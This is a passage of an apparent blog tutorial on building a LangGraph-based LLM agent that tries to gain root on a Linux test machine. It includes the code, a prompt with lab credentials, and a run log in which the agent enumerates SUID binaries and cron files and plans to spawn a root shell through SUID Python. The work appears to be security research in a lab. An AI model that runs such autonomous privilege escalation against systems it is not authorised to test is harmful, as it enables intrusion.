</span><span id="__span-22-43"><a id="__codelineno-22-43" name="__codelineno-22-43"></a>        <span class="n">ai_message</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span id="__span-22-44"><a id="__codelineno-22-44" name="__codelineno-22-44"></a>    <span class="k">elif</span> <span class="n">messages</span> <span class="o">:=</span> <span class="n">state</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;messages&quot;</span><span class="p">,</span> <span class="p">[]):</span>
</span><span id="__span-22-45"><a id="__codelineno-22-45" name="__codelineno-22-45"></a>        <span class="n">ai_message</span> <span class="o">=</span> <span class="n">messages</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span id="__span-22-46"><a id="__codelineno-22-46" name="__codelineno-22-46"></a>    <span class="k">else</span><span class="p">:</span>
</span><span id="__span-22-47"><a id="__codelineno-22-47" name="__codelineno-22-47"></a>        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;No messages found in input state to tool_edge: </span><span class="si">{</span><span class="n">state</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-22-48"><a id="__codelineno-22-48" name="__codelineno-22-48"></a>    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">ai_message</span><span class="p">,</span> <span class="s2">&quot;tool_calls&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">ai_message</span><span class="o">.</span><span class="n">tool_calls</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span id="__span-22-49"><a id="__codelineno-22-49" name="__codelineno-22-49"></a>        <span class="k">return</span> <span class="s2">&quot;tools&quot;</span>
</span><span id="__span-22-50"><a id="__codelineno-22-50" name="__codelineno-22-50"></a>    <span class="k">return</span> <span class="n">END</span>
</span></code></pre></div></td></tr></table></div>
<p>This was copied verbose from the tutorial. In summary, it checks if there's a message within the state. If it has a message and the message is a <code>tool_calls</code> message, i.e., we want to execute an external tool, the next node/action will be our tool node. Otherwise we go to the <code>END</code> node and finish our graph. Why does this work? Well, as long as there are tool calls, the tools will be executed and the results appended to the end of the message log. As soon as the LLM can find an answer, it will send out the answer (not a <code>tool_call</code>), thus the <code>route_tools</code> method will go to the <code>END</code> node.</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: finalize the graph!</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-66">66</a></span>
<span class="normal"><a href="#__codelineno-23-67">67</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-66"><a id="__codelineno-23-66" name="__codelineno-23-66"></a><span class="n">memory</span> <span class="o">=</span> <span class="n">MemorySaver</span><span class="p">()</span>
</span><span id="__span-23-67"><a id="__codelineno-23-67" name="__codelineno-23-67"></a><span class="n">graph</span> <span class="o">=</span> <span class="n">graph_builder</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="n">checkpointer</span><span class="o">=</span><span class="n">memory</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>Now we create the graph. What is <code>MemorySaver</code>? This stores our state between interactions (gives us a in-memory storage while running our agent).</p>
<p>Now, what to use as our initial message (this will be the first message within our `state['messages'] list and task our LLM to "do stuff"). We're using an adapted prompt from our hackingBuddyGPT prototype:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: The initial user question for the LLM</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-70">70</a></span>
<span class="normal"><a href="#__codelineno-24-71">71</a></span>
<span class="normal"><a href="#__codelineno-24-72">72</a></span>
<span class="normal"><a href="#__codelineno-24-73">73</a></span>
<span class="normal"><a href="#__codelineno-24-74">74</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-70"><a id="__codelineno-24-70" name="__codelineno-24-70"></a><span class="n">template</span> <span class="o">=</span> <span class="n">Template</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
</span><span id="__span-24-71"><a id="__codelineno-24-71" name="__codelineno-24-71"></a><span class="s2">You are a low-privilege user $</span><span class="si">{username}</span><span class="s2"> with password $</span><span class="si">{password}</span><span class="s2"> on a linux system and your goal is to become the root user by executing commands on the remote system.</span>
</span><span id="__span-24-72"><a id="__codelineno-24-72" name="__codelineno-24-72"></a>
</span><span id="__span-24-73"><a id="__codelineno-24-73" name="__codelineno-24-73"></a><span class="s2">Do not repeat already tried escalation attacks. You should focus upon enumeration and privilege escalation. If you were able to become root, describe the used method as final message.</span>
</span><span id="__span-24-74"><a id="__codelineno-24-74" name="__codelineno-24-74"></a><span class="s2">&quot;&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s2">&quot;lowpriv&quot;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">&quot;trustno1&quot;</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>As this was taken from my old code, it still uses the <code>Mako</code> template engine (could be replaced with a f-String or similar by now). Also, note that we hard-coded the same credentials as within the <code>SSHConnection</code> before, we will fix this in the next blog-post.</p>
<p>The prompt itself is quite simple, isn't it?</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: Start and output it</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-76">76</a></span>
<span class="normal"><a href="#__codelineno-25-77">77</a></span>
<span class="normal"><a href="#__codelineno-25-78">78</a></span>
<span class="normal"><a href="#__codelineno-25-79">79</a></span>
<span class="normal"><a href="#__codelineno-25-80">80</a></span>
<span class="normal"><a href="#__codelineno-25-81">81</a></span>
<span class="normal"><a href="#__codelineno-25-82">82</a></span>
<span class="normal"><a href="#__codelineno-25-83">83</a></span>
<span class="normal"><a href="#__codelineno-25-84">84</a></span>
<span class="normal"><a href="#__codelineno-25-85">85</a></span>
<span class="normal"><a href="#__codelineno-25-86">86</a></span>
<span class="normal"><a href="#__codelineno-25-87">87</a></span>
<span class="normal"><a href="#__codelineno-25-88">88</a></span>
<span class="normal"><a href="#__codelineno-25-89">89</a></span>
<span class="normal"><a href="#__codelineno-25-90">90</a></span>
<span class="normal"><a href="#__codelineno-25-91">91</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-76"><a id="__codelineno-25-76" name="__codelineno-25-76"></a><span class="n">events</span> <span class="o">=</span> <span class="n">graph</span><span class="o">.</span><span class="n">stream</span><span class="p">(</span>
</span><span id="__span-25-77"><a id="__codelineno-25-77" name="__codelineno-25-77"></a>    <span class="nb">input</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-25-78"><a id="__codelineno-25-78" name="__codelineno-25-78"></a>        <span class="s2">&quot;messages&quot;</span><span class="p">:</span> <span class="p">[</span>
</span><span id="__span-25-79"><a id="__codelineno-25-79" name="__codelineno-25-79"></a>            <span class="p">(</span><span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="n">template</span><span class="p">),</span>
</span><span id="__span-25-80"><a id="__codelineno-25-80" name="__codelineno-25-80"></a>        <span class="p">]</span>
</span><span id="__span-25-81"><a id="__codelineno-25-81" name="__codelineno-25-81"></a>    <span class="p">},</span>
</span><span id="__span-25-82"><a id="__codelineno-25-82" name="__codelineno-25-82"></a>    <span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-25-83"><a id="__codelineno-25-83" name="__codelineno-25-83"></a>        <span class="s2">&quot;configurable&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;thread_id&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">}</span>
</span><span id="__span-25-84"><a id="__codelineno-25-84" name="__codelineno-25-84"></a>    <span class="p">},</span>
</span><span id="__span-25-85"><a id="__codelineno-25-85" name="__codelineno-25-85"></a>    <span class="n">stream_mode</span><span class="o">=</span><span class="s2">&quot;values&quot;</span>
</span><span id="__span-25-86"><a id="__codelineno-25-86" name="__codelineno-25-86"></a><span class="p">)</span>
</span><span id="__span-25-87"><a id="__codelineno-25-87" name="__codelineno-25-87"></a>
</span><span id="__span-25-88"><a id="__codelineno-25-88" name="__codelineno-25-88"></a><span class="c1"># output all the events that we&#39;re getting from the agent</span>
</span><span id="__span-25-89"><a id="__codelineno-25-89" name="__codelineno-25-89"></a><span class="k">for</span> <span class="n">event</span> <span class="ow">in</span> <span class="n">events</span><span class="p">:</span>
</span><span id="__span-25-90"><a id="__codelineno-25-90" name="__codelineno-25-90"></a>    <span class="k">if</span> <span class="s2">&quot;messages&quot;</span> <span class="ow">in</span> <span class="n">event</span><span class="p">:</span>
</span><span id="__span-25-91"><a id="__codelineno-25-91" name="__codelineno-25-91"></a>        <span class="n">event</span><span class="p">[</span><span class="s2">&quot;messages&quot;</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">pretty_print</span><span class="p">()</span>
</span></code></pre></div></td></tr></table></div>
<p>Now, the final step: through <code>graph.stream</code> we start the graph and give it the initial task (the just mentioned question from <code>template</code>). Using <code>stream_mode="values"</code> (line 85) will create an event stream will the messages that are passing through the graph.</p>
<p>We use this events on line 88 to watch for potential changes. This allows us to output everything that is happening during exeuction.</p>
<h4 id="the-graph-in-its-full-glory"><a class="toclink" href="../../2024/10/10/first-steps-and-initial-version/#the-graph-in-its-full-glory">The graph in it's full glory</a></h4>
<p>You can use <code>graph.get_graph().draw_mermaid()</code> to get a mermaid diagram with our graph:</p>
<p><img alt="Our Graph in its full Glory" src="../../initial_prototype.svg" /></p>
<h3 id="execute-it"><a class="toclink" href="../../2024/10/10/first-steps-and-initial-version/#execute-it">Execute it</a></h3>
<p>Now you can start the prototype with <code>python initial_version.py</code> (I've cut out some noise, also the output will become better over time):</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="o">(</span>venv<span class="o">)</span><span class="w"> </span>andy@cargocult:~/offensivegraphs/src$<span class="w"> </span>python<span class="w"> </span>initial_version.py<span class="w"> </span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="o">================================</span><span class="w"> </span>Human<span class="w"> </span><span class="nv">Message</span><span class="w"> </span><span class="o">=================================</span>
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>You<span class="w"> </span>are<span class="w"> </span>a<span class="w"> </span>low-privilege<span class="w"> </span>user<span class="w"> </span>lowpriv<span class="w"> </span>with<span class="w"> </span>password<span class="w"> </span>trustno1<span class="w"> </span>on<span class="w"> </span>a<span class="w"> </span>linux<span class="w"> </span>system<span class="w"> </span>and<span class="w"> </span>your<span class="w"> </span>goal<span class="w"> </span>is<span class="w"> </span>to<span class="w"> </span>become<span class="w"> </span>the<span class="w"> </span>root<span class="w"> </span>user<span class="w"> </span>by<span class="w"> </span>executing<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>remote<span class="w"> </span>system.
</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>
</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>Do<span class="w"> </span>not<span class="w"> </span>repeat<span class="w"> </span>already<span class="w"> </span>tried<span class="w"> </span>escalation<span class="w"> </span>attacks.<span class="w"> </span>You<span class="w"> </span>should<span class="w"> </span>focus<span class="w"> </span>upon<span class="w"> </span>enumeration<span class="w"> </span>and<span class="w"> </span>privilege<span class="w"> </span>escalation.<span class="w"> </span>If<span class="w"> </span>you<span class="w"> </span>were<span class="w"> </span>able<span class="w"> </span>to<span class="w"> </span>become<span class="w"> </span>root,<span class="w"> </span>describe<span class="w"> </span>the<span class="w"> </span>used<span class="w"> </span>method<span class="w"> </span>as<span class="w"> </span>final<span class="w"> </span>message.
</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>
</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="o">==================================</span><span class="w"> </span>Ai<span class="w"> </span><span class="nv">Message</span><span class="w"> </span><span class="o">==================================</span>
</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>
</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>To<span class="w"> </span>achieve<span class="w"> </span>privilege<span class="w"> </span>escalation<span class="w"> </span>on<span class="w"> </span>a<span class="w"> </span>Linux<span class="w"> </span>system,<span class="w"> </span>we<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>follow<span class="w"> </span>a<span class="w"> </span>systematic<span class="w"> </span>approach<span class="w"> </span>that<span class="w"> </span>involves<span class="w"> </span>enumeration<span class="w"> </span>and<span class="w"> </span>identifying<span class="w"> </span>potential<span class="w"> </span>vulnerabilities<span class="w"> </span>or<span class="w"> </span>misconfigurations<span class="w"> </span>that<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>exploited.<span class="w"> </span>Here<span class="s1">&#39;s a step-by-step plan:</span>
</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>
</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="s1">1. **System Enumeration**: Gather information about the system, including kernel version, installed software, running services, and scheduled tasks. This helps in identifying potential vulnerabilities.</span>
</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a>
</span><span id="__span-26-15"><a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a><span class="s1">2. **User and Group Information**: Check the current user&#39;</span>s<span class="w"> </span>privileges,<span class="w"> </span>group<span class="w"> </span>memberships,<span class="w"> </span>and<span class="w"> </span>other<span class="w"> </span>users<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>system.<span class="w"> </span>This<span class="w"> </span>can<span class="w"> </span>reveal<span class="w"> </span>misconfigurations<span class="w"> </span>or<span class="w"> </span>potential<span class="w"> </span>targets<span class="w"> </span><span class="k">for</span><span class="w"> </span>privilege<span class="w"> </span>escalation.
</span><span id="__span-26-16"><a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a>
</span><span id="__span-26-17"><a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a><span class="m">3</span>.<span class="w"> </span>**SUID<span class="w"> </span>and<span class="w"> </span>SGID<span class="w"> </span>Binaries**:<span class="w"> </span>Identify<span class="w"> </span>binaries<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>SUID<span class="w"> </span>or<span class="w"> </span>SGID<span class="w"> </span>bit<span class="w"> </span>set,<span class="w"> </span>as<span class="w"> </span>they<span class="w"> </span>can<span class="w"> </span>sometimes<span class="w"> </span>be<span class="w"> </span>exploited<span class="w"> </span>to<span class="w"> </span>gain<span class="w"> </span>elevated<span class="w"> </span>privileges.
</span><span id="__span-26-18"><a id="__codelineno-26-18" name="__codelineno-26-18" href="#__codelineno-26-18"></a>
</span><span id="__span-26-19"><a id="__codelineno-26-19" name="__codelineno-26-19" href="#__codelineno-26-19"></a><span class="m">4</span>.<span class="w"> </span>**World-Writable<span class="w"> </span>Files<span class="w"> </span>and<span class="w"> </span>Directories**:<span class="w"> </span>Look<span class="w"> </span><span class="k">for</span><span class="w"> </span>files<span class="w"> </span>and<span class="w"> </span>directories<span class="w"> </span>that<span class="w"> </span>are<span class="w"> </span>world-writable,<span class="w"> </span>as<span class="w"> </span>they<span class="w"> </span>might<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>to<span class="w"> </span>inject<span class="w"> </span>malicious<span class="w"> </span>code<span class="w"> </span>or<span class="w"> </span>scripts.
</span><span id="__span-26-20"><a id="__codelineno-26-20" name="__codelineno-26-20" href="#__codelineno-26-20"></a>
</span><span id="__span-26-21"><a id="__codelineno-26-21" name="__codelineno-26-21" href="#__codelineno-26-21"></a><span class="m">5</span>.<span class="w"> </span>**Cron<span class="w"> </span>Jobs<span class="w"> </span>and<span class="w"> </span>Scheduled<span class="w"> </span>Tasks**:<span class="w"> </span>Examine<span class="w"> </span>cron<span class="w"> </span><span class="nb">jobs</span><span class="w"> </span>and<span class="w"> </span>other<span class="w"> </span>scheduled<span class="w"> </span>tasks<span class="w"> </span><span class="k">for</span><span class="w"> </span>scripts<span class="w"> </span>or<span class="w"> </span>binaries<span class="w"> </span>that<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>modified<span class="w"> </span>or<span class="w"> </span>exploited.
</span><span id="__span-26-22"><a id="__codelineno-26-22" name="__codelineno-26-22" href="#__codelineno-26-22"></a>
</span><span id="__span-26-23"><a id="__codelineno-26-23" name="__codelineno-26-23" href="#__codelineno-26-23"></a><span class="m">6</span>.<span class="w"> </span>**Exploiting<span class="w"> </span>Vulnerabilities**:<span class="w"> </span>If<span class="w"> </span>any<span class="w"> </span>known<span class="w"> </span>vulnerabilities<span class="w"> </span>are<span class="w"> </span>found<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>system<span class="w"> </span>or<span class="w"> </span>installed<span class="w"> </span>software,<span class="w"> </span>attempt<span class="w"> </span>to<span class="w"> </span>exploit<span class="w"> </span>them<span class="w"> </span>to<span class="w"> </span>gain<span class="w"> </span>root<span class="w"> </span>access.
</span><span id="__span-26-24"><a id="__codelineno-26-24" name="__codelineno-26-24" href="#__codelineno-26-24"></a>
</span><span id="__span-26-25"><a id="__codelineno-26-25" name="__codelineno-26-25" href="#__codelineno-26-25"></a><span class="m">7</span>.<span class="w"> </span>**Kernel<span class="w"> </span>Exploits**:<span class="w"> </span>If<span class="w"> </span>the<span class="w"> </span>kernel<span class="w"> </span>is<span class="w"> </span>outdated,<span class="w"> </span>check<span class="w"> </span><span class="k">for</span><span class="w"> </span>any<span class="w"> </span>known<span class="w"> </span>exploits<span class="w"> </span>that<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>to<span class="w"> </span>gain<span class="w"> </span>root<span class="w"> </span>access.
</span><span id="__span-26-26"><a id="__codelineno-26-26" name="__codelineno-26-26" href="#__codelineno-26-26"></a>
</span><span id="__span-26-27"><a id="__codelineno-26-27" name="__codelineno-26-27" href="#__codelineno-26-27"></a>Let<span class="s1">&#39;s start with the enumeration phase by executing some commands to gather information about the system. I&#39;</span>ll<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands:
</span><span id="__span-26-28"><a id="__codelineno-26-28" name="__codelineno-26-28" href="#__codelineno-26-28"></a>
</span><span id="__span-26-29"><a id="__codelineno-26-29" name="__codelineno-26-29" href="#__codelineno-26-29"></a>-<span class="w"> </span><span class="sb">`</span>uname<span class="w"> </span>-a<span class="sb">`</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>the<span class="w"> </span>kernel<span class="w"> </span>version<span class="w"> </span>and<span class="w"> </span>system<span class="w"> </span>architecture.
</span><span id="__span-26-30"><a id="__codelineno-26-30" name="__codelineno-26-30" href="#__codelineno-26-30"></a>-<span class="w"> </span><span class="sb">`</span>id<span class="sb">`</span><span class="w"> </span>to<span class="w"> </span>check<span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>user<span class="s1">&#39;s privileges and group memberships.</span>
</span><span id="__span-26-31"><a id="__codelineno-26-31" name="__codelineno-26-31" href="#__codelineno-26-31"></a><span class="s1">- `find / -perm -4000 2&gt;/dev/null` to list SUID binaries.</span>
</span><span id="__span-26-32"><a id="__codelineno-26-32" name="__codelineno-26-32" href="#__codelineno-26-32"></a><span class="s1">- `find / -perm -2000 2&gt;/dev/null` to list SGID binaries.</span>
</span><span id="__span-26-33"><a id="__codelineno-26-33" name="__codelineno-26-33" href="#__codelineno-26-33"></a><span class="s1">- `find / -writable -type d 2&gt;/dev/null` to find world-writable directories.</span>
</span><span id="__span-26-34"><a id="__codelineno-26-34" name="__codelineno-26-34" href="#__codelineno-26-34"></a><span class="s1">- `crontab -l` to list the current user&#39;</span>s<span class="w"> </span>cron<span class="w"> </span>jobs.
</span><span id="__span-26-35"><a id="__codelineno-26-35" name="__codelineno-26-35" href="#__codelineno-26-35"></a>-<span class="w"> </span><span class="sb">`</span>cat<span class="w"> </span>/etc/crontab<span class="sb">`</span><span class="w"> </span>to<span class="w"> </span>view<span class="w"> </span>system-wide<span class="w"> </span>cron<span class="w"> </span>jobs.
</span><span id="__span-26-36"><a id="__codelineno-26-36" name="__codelineno-26-36" href="#__codelineno-26-36"></a>
</span><span id="__span-26-37"><a id="__codelineno-26-37" name="__codelineno-26-37" href="#__codelineno-26-37"></a>
</span><span id="__span-26-38"><a id="__codelineno-26-38" name="__codelineno-26-38" href="#__codelineno-26-38"></a>cmd<span class="w"> </span>executed:<span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</span><span id="__span-26-39"><a id="__codelineno-26-39" name="__codelineno-26-39" href="#__codelineno-26-39"></a>result:<span class="w">  </span>/var/mail
</span><span id="__span-26-40"><a id="__codelineno-26-40" name="__codelineno-26-40" href="#__codelineno-26-40"></a>/var/local
</span><span id="__span-26-41"><a id="__codelineno-26-41" name="__codelineno-26-41" href="#__codelineno-26-41"></a>/var/log/journal
</span><span id="__span-26-42"><a id="__codelineno-26-42" name="__codelineno-26-42" href="#__codelineno-26-42"></a>/var/log/journal/c9c36c71f63f41ba8d4b51f857984e51
</span><span id="__span-26-43"><a id="__codelineno-26-43" name="__codelineno-26-43" href="#__codelineno-26-43"></a>/run/log/journal
</span><span id="__span-26-44"><a id="__codelineno-26-44" name="__codelineno-26-44" href="#__codelineno-26-44"></a>/usr/bin/crontab
</span><span id="__span-26-45"><a id="__codelineno-26-45" name="__codelineno-26-45" href="#__codelineno-26-45"></a>/usr/bin/chage
</span><span id="__span-26-46"><a id="__codelineno-26-46" name="__codelineno-26-46" href="#__codelineno-26-46"></a>/usr/bin/dotlockfile
</span><span id="__span-26-47"><a id="__codelineno-26-47" name="__codelineno-26-47" href="#__codelineno-26-47"></a>/usr/bin/expiry
</span><span id="__span-26-48"><a id="__codelineno-26-48" name="__codelineno-26-48" href="#__codelineno-26-48"></a>/usr/bin/ssh-agent
</span><span id="__span-26-49"><a id="__codelineno-26-49" name="__codelineno-26-49" href="#__codelineno-26-49"></a>/usr/sbin/unix_chkpwd
</span><span id="__span-26-50"><a id="__codelineno-26-50" name="__codelineno-26-50" href="#__codelineno-26-50"></a>
</span><span id="__span-26-51"><a id="__codelineno-26-51" name="__codelineno-26-51" href="#__codelineno-26-51"></a>cmd<span class="w"> </span>executed:<span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</span><span id="__span-26-52"><a id="__codelineno-26-52" name="__codelineno-26-52" href="#__codelineno-26-52"></a>result:<span class="w">  </span>/usr/bin/newgrp
</span><span id="__span-26-53"><a id="__codelineno-26-53" name="__codelineno-26-53" href="#__codelineno-26-53"></a>/usr/bin/gpasswd
</span><span id="__span-26-54"><a id="__codelineno-26-54" name="__codelineno-26-54" href="#__codelineno-26-54"></a>/usr/bin/su
</span><span id="__span-26-55"><a id="__codelineno-26-55" name="__codelineno-26-55" href="#__codelineno-26-55"></a>/usr/bin/find
</span><span id="__span-26-56"><a id="__codelineno-26-56" name="__codelineno-26-56" href="#__codelineno-26-56"></a>/usr/bin/chfn
</span><span id="__span-26-57"><a id="__codelineno-26-57" name="__codelineno-26-57" href="#__codelineno-26-57"></a>/usr/bin/passwd
</span><span id="__span-26-58"><a id="__codelineno-26-58" name="__codelineno-26-58" href="#__codelineno-26-58"></a>/usr/bin/python3.11
</span><span id="__span-26-59"><a id="__codelineno-26-59" name="__codelineno-26-59" href="#__codelineno-26-59"></a>/usr/bin/chsh
</span><span id="__span-26-60"><a id="__codelineno-26-60" name="__codelineno-26-60" href="#__codelineno-26-60"></a>/usr/bin/umount
</span><span id="__span-26-61"><a id="__codelineno-26-61" name="__codelineno-26-61" href="#__codelineno-26-61"></a>/usr/bin/sudo
</span><span id="__span-26-62"><a id="__codelineno-26-62" name="__codelineno-26-62" href="#__codelineno-26-62"></a>/usr/bin/mount
</span><span id="__span-26-63"><a id="__codelineno-26-63" name="__codelineno-26-63" href="#__codelineno-26-63"></a>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span><span id="__span-26-64"><a id="__codelineno-26-64" name="__codelineno-26-64" href="#__codelineno-26-64"></a>/usr/lib/openssh/ssh-keysign
</span><span id="__span-26-65"><a id="__codelineno-26-65" name="__codelineno-26-65" href="#__codelineno-26-65"></a>
</span><span id="__span-26-66"><a id="__codelineno-26-66" name="__codelineno-26-66" href="#__codelineno-26-66"></a><span class="o">==================================</span><span class="w"> </span>Ai<span class="w"> </span><span class="nv">Message</span><span class="w"> </span><span class="o">==================================</span>
</span><span id="__span-26-67"><a id="__codelineno-26-67" name="__codelineno-26-67" href="#__codelineno-26-67"></a>
</span><span id="__span-26-68"><a id="__codelineno-26-68" name="__codelineno-26-68" href="#__codelineno-26-68"></a>Based<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>enumeration<span class="w"> </span>results,<span class="w"> </span>here<span class="s1">&#39;s what we have found:</span>
</span><span id="__span-26-69"><a id="__codelineno-26-69" name="__codelineno-26-69" href="#__codelineno-26-69"></a>
</span><span id="__span-26-70"><a id="__codelineno-26-70" name="__codelineno-26-70" href="#__codelineno-26-70"></a><span class="s1">1. **System Information**: The system is running Linux kernel version 6.1.0-26-amd64 on a Debian-based distribution.</span>
</span><span id="__span-26-71"><a id="__codelineno-26-71" name="__codelineno-26-71" href="#__codelineno-26-71"></a>
</span><span id="__span-26-72"><a id="__codelineno-26-72" name="__codelineno-26-72" href="#__codelineno-26-72"></a><span class="s1">2. **User Information**: The current user is `lowpriv` with UID 1001 and GID 1001, and is not part of any special groups.</span>
</span><span id="__span-26-73"><a id="__codelineno-26-73" name="__codelineno-26-73" href="#__codelineno-26-73"></a>
</span><span id="__span-26-74"><a id="__codelineno-26-74" name="__codelineno-26-74" href="#__codelineno-26-74"></a><span class="s1">3. **SUID Binaries**: There are several SUID binaries, including `/usr/bin/find`, `/usr/bin/sudo`, and `/usr/bin/python3.11`. These can potentially be exploited for privilege escalation.</span>
</span><span id="__span-26-75"><a id="__codelineno-26-75" name="__codelineno-26-75" href="#__codelineno-26-75"></a>
</span><span id="__span-26-76"><a id="__codelineno-26-76" name="__codelineno-26-76" href="#__codelineno-26-76"></a><span class="s1">4. **SGID Binaries**: There are several SGID binaries, but none immediately stand out as exploitable without further context.</span>
</span><span id="__span-26-77"><a id="__codelineno-26-77" name="__codelineno-26-77" href="#__codelineno-26-77"></a>
</span><span id="__span-26-78"><a id="__codelineno-26-78" name="__codelineno-26-78" href="#__codelineno-26-78"></a><span class="s1">5. **World-Writable Directories**: There are several world-writable directories, including `/var/tmp` and `/tmp`, which could be used for temporary file manipulation attacks.</span>
</span><span id="__span-26-79"><a id="__codelineno-26-79" name="__codelineno-26-79" href="#__codelineno-26-79"></a>
</span><span id="__span-26-80"><a id="__codelineno-26-80" name="__codelineno-26-80" href="#__codelineno-26-80"></a><span class="s1">6. **Cron Jobs**: There are no user-specific cron jobs for `lowpriv`, but there are system-wide cron jobs executed by the root user.</span>
</span><span id="__span-26-81"><a id="__codelineno-26-81" name="__codelineno-26-81" href="#__codelineno-26-81"></a>
</span><span id="__span-26-82"><a id="__codelineno-26-82" name="__codelineno-26-82" href="#__codelineno-26-82"></a><span class="s1">### Potential Exploitation Path</span>
</span><span id="__span-26-83"><a id="__codelineno-26-83" name="__codelineno-26-83" href="#__codelineno-26-83"></a>
</span><span id="__span-26-84"><a id="__codelineno-26-84" name="__codelineno-26-84" href="#__codelineno-26-84"></a><span class="s1">The presence of the SUID bit on `/usr/bin/python3.11` is particularly interesting. Python can be used to execute commands, and if it retains the SUID privileges, it might allow us to execute commands as the root user.</span>
</span><span id="__span-26-85"><a id="__codelineno-26-85" name="__codelineno-26-85" href="#__codelineno-26-85"></a>
</span><span id="__span-26-86"><a id="__codelineno-26-86" name="__codelineno-26-86" href="#__codelineno-26-86"></a><span class="s1">Let&#39;</span>s<span class="w"> </span>attempt<span class="w"> </span>to<span class="w"> </span>exploit<span class="w"> </span>the<span class="w"> </span>SUID<span class="w"> </span>bit<span class="w"> </span>on<span class="w"> </span>Python<span class="w"> </span>to<span class="w"> </span>gain<span class="w"> </span>root<span class="w"> </span>access.<span class="w"> </span>We<span class="s1">&#39;ll use the following command to spawn a root shell:</span>
</span><span id="__span-26-87"><a id="__codelineno-26-87" name="__codelineno-26-87" href="#__codelineno-26-87"></a>
